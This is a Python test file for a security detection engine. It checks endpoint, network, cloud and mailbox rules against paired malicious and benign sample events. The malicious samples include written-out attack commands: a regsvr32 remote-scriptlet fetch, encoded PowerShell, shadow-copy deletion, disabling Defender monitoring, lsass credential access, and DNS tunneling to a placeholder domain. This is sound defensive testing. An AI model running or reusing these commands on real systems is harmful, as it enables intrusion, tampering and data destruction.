"""Phase 4 endpoint, network, cloud, and email rules: a positive and a near-miss each."""
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from warden.correlate import correlate
from warden.detect import detect
from warden.detections._network import is_internal
from warden.events import CloudAuditEvent, FileEvent, NetworkEvent, ProcessEvent
from warden.evaluate import discover, run
from warden.ingest import normalize

T0 = datetime(2026, 9, 2, 9, 0, tzinfo=timezone.utc)
ROOT = Path(__file__).resolve().parents[1]


def P(s=0, **kw):
    kw.setdefault("host", "ws-1")
    return ProcessEvent(ts=T0 + timedelta(seconds=s), **kw)


def N(s=0, **kw):
    kw.setdefault("host", "ws-1")
    return NetworkEvent(ts=T0 + timedelta(seconds=s), **kw)


def C(s=0, call="", params=None, raw=None, **kw):
    kw.setdefault("user", "bob")
    return CloudAuditEvent(ts=T0 + timedelta(seconds=s), provider="aws", api_call=call,
                           raw={"requestParameters": params or {}, **(raw or {})}, **kw)


def fires(rule, evs, **kw):
    return [a for a in detect(normalize(evs), only=[rule], **kw)]


@pytest.mark.parametrize("rule,hit,miss", [
    ("suspicious_parent_child",
     P(parent_name="winword.exe", process_name="powershell.exe", command_line="powershell"),
     P(parent_name="winword.exe", process_name="splwow64.exe")),
    ("lolbin_abuse",
     P(process_name="regsvr32.exe", command_line="regsvr32 /s /u /i:http://x/a.sct scrobj.dll"),
     P(process_name="regsvr32.exe", command_line="regsvr32 /s C:\\Windows\\System32\\vbscript.dll")),
    ("encoded_powershell",
     P(process_name="powershell.exe", command_line="powershell -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"),
     P(process_name="powershell.exe", command_line="powershell -nop -w hidden Get-Service")),
    ("credential_dumping",
     P(action="access", process_name="evil.exe", target="C:\\Windows\\system32\\lsass.exe", granted_access="0x1010"),
     P(action="access", process_name="msmpeng.exe", target="C:\\Windows\\system32\\lsass.exe", granted_access="0x1010")),
    ("persistence_mechanism",
     P(action="service_installed", target="%COMSPEC% /c powershell -enc AAA"),
     P(action="service_installed", target='"C:\\Program Files\\Vendor\\agent.exe"')),
    ("log_clearing",
     P(action="log_cleared", target="Security", user="u1"),
     P(process_name="wevtutil.exe", command_line="wevtutil qe Security /c:5")),
    ("security_tool_tamper",
     P(process_name="powershell.exe", command_line="Set-MpPreference -DisableRealtimeMonitoring $true"),
     P(process_name="powershell.exe", command_line="Get-MpPreference")),
    ("ransomware_precursor",
     P(process_name="vssadmin.exe", command_line="vssadmin delete shadows /all /quiet"),
     P(process_name="vssadmin.exe", command_line="vssadmin list shadows")),
])
def test_endpoint_rule(rule, hit, miss):
    assert fires(rule, [hit]) and not fires(rule, [miss])


def test_mass_file_encryption():
    evs = [FileEvent(ts=T0 + timedelta(seconds=i * 0.3), host="fs", process_name="x.exe", action="rename",
                     path=f"D:\\s\\{i}.docx.locked") for i in range(60)]
    assert fires("mass_file_encryption", evs)
    same_ext = [e.model_copy(update={"path": f"D:\\s\\{i}.tmp"}) for i, e in enumerate(evs)]
    assert not fires("mass_file_encryption", same_ext)
    note = [FileEvent(ts=T0, host="fs", process_name="x.exe", action="create", path="C:\\Users\\a\\HOW_TO_DECRYPT.txt")]
    assert fires("mass_file_encryption", note)


def test_beaconing_needs_low_jitter():
    steady = [N(i * 300 + (i % 2) * 5, source_ip="10.0.0.5", dest_ip="185.1.2.3", dest_port=443) for i in range(10)]
    assert fires("beaconing", steady)
    noisy = [N(s, source_ip="10.0.0.5", dest_ip="185.1.2.3", dest_port=443)
             for s in (0, 40, 900, 1000, 4000, 4100, 9000, 9200, 15000, 15050)]
    assert not fires("beaconing", noisy)
    internal = [e.model_copy(update={"dest_ip": "10.0.0.9"}) for e in steady]
    assert not fires("beaconing", internal)


def test_dns_tunneling_and_normal_dns():
    import random
    rng = random.Random(1)
    tun = [N(i, protocol="dns", domain="".join(rng.choice("abcdefghijklmnop234567") for _ in range(36)) + ".evil.net")
           for i in range(40)]
    assert fires("dns_tunneling", tun)
    normal = [N(i, protocol="dns", domain=f"www{i % 3}.example.com") for i in range(40)]
    assert not fires("dns_tunneling", normal)


def test_lateral_fanout_and_port_scan():
    fan = [N(i * 10, source_ip="10.0.0.5", dest_ip=f"10.0.1.{i}", dest_port=445) for i in range(6)]
    [a] = fires("lateral_movement_fanout", fan)
    assert a.mitre == ["T1021.002"]
    assert not fires("lateral_movement_fanout", fan[:3])
    scan = [N(i, source_ip="10.0.0.5", dest_ip="10.0.9.9", dest_port=p, action="blocked") for i, p in enumerate(range(20, 45))]
    assert fires("port_scan", scan) and not fires("port_scan", scan[:5])


def test_exfil_needs_new_destination():
    big = [N(i * 60, source_ip="10.0.0.5", dest_ip="198.51.100.9", dest_port=443, bytes_out=200_000_000) for i in range(4)]
    assert fires("data_exfiltration", big)
    known = [N(-86400, source_ip="10.0.0.5", dest_ip="198.51.100.9", dest_port=443, bytes_out=1)]
    assert not fires("data_exfiltration", big, prior=known)


def test_ioc_match_respects_confidence():
    ev = [N(0, source_ip="10.0.0.5", dest_ip="50.16.16.211", dest_port=443)]
    lookup = lambda vals: {"50.16.16.211": [{"source": "feodo", "confidence": 90, "tags": {"malware": "QakBot"}}]}
    assert fires("intel_ioc_match", ev, ioc_lookup=lookup)
    low = lambda vals: {"50.16.16.211": [{"source": "tor_exit", "confidence": 30, "tags": {}}]}
    assert not fires("intel_ioc_match", ev, ioc_lookup=low)


def test_is_internal_excludes_documentation_ranges():
    assert is_internal("10.1.2.3") and is_internal("100.64.0.1")
    assert not is_internal("198.51.100.9") and not is_internal("203.0.113.5")


@pytest.mark.parametrize("rule,hit,miss", [
    ("iam_admin_grant", C(call="AttachUserPolicy", params={"userName": "x", "policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"}),
     C(call="AttachUserPolicy", params={"userName": "x", "policyArn": "arn:aws:iam::aws:policy/ReadOnlyAccess"})),
    ("new_access_key", C(call="CreateAccessKey", params={"userName": "admin"}), C(call="CreateAccessKey", params={})),
    ("public_bucket", C(call="PutBucketPolicy", params={"bucketName": "b", "bucketPolicy": {"Statement": [
        {"Effect": "Allow", "Principal": "*", "Action": "s3:GetObject"}]}}),
     C(call="PutBucketPolicy", params={"bucketName": "b", "bucketPolicy": {"Statement": [
         {"Effect": "Allow", "Principal": {"AWS": "arn:aws:iam::1:role/r"}, "Action": "s3:GetObject"}]}})),
    ("cloud_logging_disabled", C(call="StopLogging"), C(call="StartLogging")),
    ("unusual_region", C(call="RunInstances", region="ap-south-1"), C(call="RunInstances", region="us-east-1")),
    ("console_login_no_mfa",
     C(call="ConsoleLogin", raw={"userIdentity": {"type": "IAMUser"}, "responseElements": {"ConsoleLogin": "Success"},
                                 "additionalEventData": {"MFAUsed": "No"}}),
     C(call="ConsoleLogin", raw={"userIdentity": {"type": "IAMUser"}, "responseElements": {"ConsoleLogin": "Success"},
                                 "additionalEventData": {"MFAUsed": "Yes"}})),
])
def test_cloud_rule(rule, hit, miss):
    assert fires(rule, [hit]) and not fires(rule, [miss])


def test_mailbox_forwarding_external_only():
    def rule(to):
        return CloudAuditEvent(ts=T0, provider="m365", api_call="New-InboxRule", user="cfo@corp.example",
                               raw={"Parameters": [{"Name": "ForwardTo", "Value": to}]})
    assert fires("mailbox_forwarding_rule", [rule("x@proton.me")])
    assert not fires("mailbox_forwarding_rule", [rule("assistant@corp.example")])


def test_endpoint_alerts_on_one_host_merge_but_different_hosts_do_not():
    a = detect(normalize([P(parent_name="winword.exe", process_name="cmd.exe", command_line="cmd /c x", user="SYSTEM"),
                          P(60, action="log_cleared", target="Security", user="SYSTEM")]))
    assert len(correlate(a)) == 1                         # same host, SYSTEM user does not block it
    b = detect(normalize([P(parent_name="winword.exe", process_name="cmd.exe", command_line="cmd", user="SYSTEM"),
                          P(60, action="log_cleared", target="Security", host="ws-2", user="SYSTEM")]))
    assert len(correlate(b)) == 2                         # SYSTEM is not a link between machines


def test_phase4_exit_bar():
    rep = run(discover(ROOT / "data" / "eval"), with_llm=False)
    from warden.detections import REGISTRY, load_all
    load_all()
    assert len(REGISTRY) >= 30
    tactics = {"T1110", "T1078", "T1059", "T1003", "T1021", "T1071", "T1486", "T1562", "T1530"}
    assert tactics <= {t.split(".")[0] for d in REGISTRY.values() for t in d.mitre}
    assert rep.overall.precision >= 0.9 and rep.overall.recall >= 0.9 and rep.merge_rate == 1.0
